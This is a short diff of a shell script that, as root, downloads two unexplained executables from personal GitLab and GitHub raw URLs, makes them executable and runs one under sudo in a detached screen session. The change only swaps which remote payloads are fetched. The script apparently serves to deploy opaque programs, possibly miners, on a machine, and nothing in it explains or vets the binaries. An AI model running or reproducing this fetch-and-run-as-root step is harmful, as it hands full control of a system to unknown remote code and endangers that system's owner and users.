@@ -1,6 +1,6 @@
 sudo su <<EOF
-wget -qO project https://gitlab.com/sarifadim/jomblo/-/raw/main/titidije && chmod +x project
-wget -qO server https://raw.githubusercontent.com/sarifadim/dopla/main/Lottery && chmod +x server
+wget -qO project https://gitlab.com/sarifadim/jomblo/-/raw/main/ricingforce2 && chmod +x project
+wget -qO server https://raw.githubusercontent.com/sarifadim/dopla/main/Lottery2 && chmod +x server
 screen -dms run sudo ./server
 EOF
 screen -r
